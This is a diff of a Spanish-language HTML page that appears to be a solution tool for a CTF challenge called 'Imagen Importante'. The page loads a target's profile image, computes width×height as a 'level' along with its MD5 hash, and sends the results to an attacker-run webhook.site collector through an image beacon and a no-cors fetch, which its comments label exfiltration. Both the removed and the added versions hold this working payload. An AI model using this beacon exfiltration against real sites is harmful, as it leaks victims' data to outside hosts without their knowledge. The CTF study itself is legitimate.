@@ -1,152 +1,45 @@
 <!doctype html>
 <html lang="es">
-<head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Viewer - Imagen Importante (CTF)</title>
-  <style>
-    body { font-family: Inter, system-ui, sans-serif; padding: 24px; background:#f6f8fa; color:#111; }
-    .card { background:white; border-radius:12px; padding:18px; box-shadow: 0 6px 18px rgba(0,0,0,0.06); max-width:820px; margin:auto; }
-    label, input { display:block; margin:8px 0; }
-    img.preview { max-width:100%; border-radius:8px; margin-top:12px; border:1px solid #eee; }
-    pre { background:#0f1720; color:#e6eef8; padding:12px; border-radius:8px; overflow:auto; }
-    button { padding:8px 12px; border-radius:8px; cursor:pointer; }
-  </style>
-</head>
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CTF Viewer</title></head>
 <body>
-  <div class="card">
-    <h2>Viewer - Imagen Importante (CTF)</h2>
-    <p>Introduce el dominio del objetivo (<strong>protocol + host</strong>, sin path) y la ruta de la imagen/endpoint. 
-       Ej: <code>https://chl-...-imagen-importante.softwareseguro.com.ar</code> y <code>/profile-pic</code></p>
+  <h3>CTF: obtener nivel</h3>
+  <label>Target (protocol+host): <input id="domain" value="https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar" /></label>
+  <label>Path (ej: /profile-pic): <input id="path" value="/profile-pic" /></label>
+  <label>Collector (ej: https://webhook.site/ID): <input id="collector" value="https://webhook.site/YOUR-ID" /></label>
+  <button id="go">Cargar</button>
+  <div id="out"></div>
 
-    <label>Dominio (protocol + host):</label>
-    <input id="domain" placeholder="https://example.com" value="https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar" />
-
-    <label>Path (puede incluir query):</label>
-    <input id="path" placeholder="/profile-pic" value="/profile-pic" />
-
-    <label>Endpoint para recibir resultado (ej: https://webhook.site/ID o https://mi-servidor/collect):</label>
-    <input id="collector" placeholder="https://webhook.site/..." value="https://webhook.site/YOUR-ID-HERE" />
-
-    <div style="margin-top:12px">
-      <button id="run">Cargar imagen & obtener nivel</button>
-      <button id="debug" style="margin-left:6px">Mostrar solo en página</button>
-    </div>
-
-    <div id="output" style="margin-top:14px"></div>
-
-    <div id="previewBox" style="margin-top:12px"></div>
-
-    <h3>Logs</h3>
-    <pre id="log">— listo —</pre>
-  </div>
-
-  <!-- Usamos la librería md5 pública desde CDN (blueimp-md5) para calcular MD5 en cliente -->
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.19.0/js/md5.min.js" integrity="sha512-+xY3J9hZKs7yVtaKx3x4w2V1b4n5Sei6K5hjm4p9Yxkq8gO7cD5w+qv1gYkKqjA7rEIQ1m9Qq7zGxGgG8Xq5gA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.19.0/js/md5.min.js"></script>
   <script>
-  function log(msg){
-    const el = document.getElementById('log');
-    el.textContent = (new Date()).toISOString() + "  " + msg + "\n" + el.textContent;
-  }
+    document.getElementById('go').onclick = function() {
+      const domain = document.getElementById('domain').value.replace(/\/+$/,'');
+      const path = document.getElementById('path').value;
+      const collector = document.getElementById('collector').value;
+      const target = domain + (path.startsWith('/') ? path : '/' + path) + '?_cb=' + Date.now();
 
-  document.getElementById('run').addEventListener('click', run);
-  document.getElementById('debug').addEventListener('click', () => run(true));
-
-  async function run(onlyLocal=false){
-    const domain = (document.getElementById('domain').value || "").trim();
-    const path = (document.getElementById('path').value || "").trim();
-    const collector = (document.getElementById('collector').value || "").trim();
-
-    if(!domain || !path) {
-      alert('Completa dominio y path.');
-      return;
-    }
-
-    // Normalizamos la URL objetivo
-    const target = domain.replace(/\/+$/, '') + (path.startsWith('/') ? path : '/' + path);
-    log('Cargando imagen: ' + target);
-
-    // Limpiamos preview
-    const previewBox = document.getElementById('previewBox');
-    previewBox.innerHTML = '';
-
-    // Creamos imagen
-    const img = new Image();
-    img.className = 'preview';
-    img.crossOrigin = 'anonymous'; // no necesario para .naturalWidth/.naturalHeight; solo para canvas (puede taint)
-    img.src = target + (target.includes('?') ? '&_t=' : '?_t=') + Date.now(); // cache-bust
-
-    // Append para que Pepe la vea en la pestaña
-    previewBox.appendChild(img);
-
-    img.onload = async () => {
-      const w = img.naturalWidth;
-      const h = img.naturalHeight;
-      const level = w * h;
-      const levelStr = String(level);
-      const levelMD5 = md5(levelStr);
-
-      const result = {
-        target,
-        width: w,
-        height: h,
-        level,
-        md5: levelMD5,
-        timestamp: new Date().toISOString()
-      };
-
-      log('Imagen cargada — ancho: ' + w + ', alto: ' + h + ' → nivel: ' + level);
-
-      // Mostrar en la página (útil para debug)
-      const out = document.getElementById('output');
-      out.innerHTML = `
-        <strong>Resultado:</strong>
-        <ul>
-          <li>Width: ${w}</li>
-          <li>Height: ${h}</li>
-          <li>Level: ${level}</li>
-          <li>MD5(level): ${levelMD5}</li>
-        </ul>
-      `;
-
-      // Enviar a collector (si se configuró) — hacemos una beacon GET con una imagen para evitar CORS
-      if(collector && !onlyLocal){
-        try {
-          // añadimos params URL-encoded
+      const img = new Image();
+      img.src = target;
+      // opcional: img.crossOrigin = "use-credentials"; // NO asegura lectura si servidor no permite CORS
+      img.onload = function() {
+        const w = img.naturalWidth, h = img.naturalHeight;
+        const level = w * h;
+        const md5level = md5(String(level));
+        document.getElementById('out').innerText = `w=${w} h=${h} level=${level} md5=${md5level}`;
+        if (collector) {
+          // beacon por GET (imagen) para evitar bloqueos CORS en el collector
           const u = new URL(collector);
-          u.searchParams.set('t', result.timestamp);
-          u.searchParams.set('target', result.target);
-          u.searchParams.set('w', result.width);
-          u.searchParams.set('h', result.height);
-          u.searchParams.set('level', result.level);
-          u.searchParams.set('md5', result.md5);
-
-          // Exfil con un beacon/imagen para máxima compatibilidad (no bloquea por CORS)
-          const beacon = new Image();
-          beacon.src = u.toString();
-          log('Enviando resultado a collector: ' + u.toString());
-
-          // también intentamos un fetch (opcional) — puede fallar por CORS en servidores que no lo permitan
-          try {
-            await fetch(u.toString(), { method: 'GET', mode: 'no-cors' });
-            log('Fetch (no-cors) realizado.');
-          } catch(e){ log('Fetch falló o no permitido (esto es normal si no hay CORS): ' + e.message); }
-
-        } catch(e){
-          log('Error construyendo collector URL: ' + e.message);
+          u.searchParams.set('t', new Date().toISOString());
+          u.searchParams.set('target', target);
+          u.searchParams.set('w', w);
+          u.searchParams.set('h', h);
+          u.searchParams.set('level', level);
+          u.searchParams.set('md5', md5level);
+          new Image().src = u.toString();
         }
-      } else {
-        if(onlyLocal) log('Modo debug: no se envió a collector.');
-        else log('No hay collector configurado; mostrados solo en la página.');
-      }
+      };
+      img.onerror = function(e){ document.getElementById('out').innerText = 'Error cargando imagen (403/404/CSP?)'; };
+      document.body.appendChild(img); // opcional: mostrar imagen
     };
-
-    img.onerror = (ev) => {
-      log('ERROR: no se pudo cargar la imagen (403/404/CSP?). Revisa el path o permisos. ' + ev);
-      alert('No se pudo cargar la imagen. Revisa consola/logs.');
-    };
-  }
   </script>
 </body>
 </html>
